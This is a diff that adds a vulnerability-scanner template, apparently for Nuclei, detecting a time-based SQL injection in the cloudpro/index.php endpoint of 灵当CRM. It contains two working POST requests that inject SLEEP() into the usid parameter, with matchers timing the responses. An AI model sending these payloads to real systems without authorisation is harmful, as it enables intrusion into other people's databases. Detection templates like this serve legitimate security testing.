@@ -1,0 +1,31 @@
+id: lingdangCRM-cloudpro_index_php-sql-time
+
+info:
+  name: 灵当CRM cloudpro/index.php SQL延时注入漏洞
+  author: xxx
+  severity: high
+  tags: sql injection
+
+
+http:
+  - raw:
+      - |
+        POST /crm/WeiXinApp/cloudpro/index.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-type: application/x-www-form-urlencoded
+
+        action=getMyAccount&usid=1 AND (SELECT 1 FROM (SELECT SLEEP(2))a) -- q&my_cloudid=0
+      - |
+        POST /crm/WeiXinApp/cloudpro/index.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-type: application/x-www-form-urlencoded
+
+        action=getMyAccount&usid=1 AND (SELECT 1 FROM (SELECT SLEEP(4))a) -- q&my_cloudid=0
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
